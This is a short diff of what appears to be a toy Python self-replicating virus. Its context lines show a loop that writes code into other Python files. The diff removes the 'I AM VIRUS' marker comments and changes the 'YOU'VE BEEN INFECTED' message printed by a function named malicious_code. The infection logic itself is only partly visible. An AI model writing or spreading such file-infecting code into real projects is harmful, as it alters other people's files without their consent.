@@ -1,5 +1,3 @@
-# I AM VIRUS !
-
 import sys
 import glob
 
@@ -40,8 +38,6 @@ for file in python_files:
             f.writelines(final_code)
 
 def malicious_code():
-    print("YOU HAVE BEEN INFECTED HAHAHA !!!")
+    print("YOU'VE BEEN INFECTED WOOHAHA!!!")
 
 malicious_code()
-
-# VIRUS SAYS BYE!
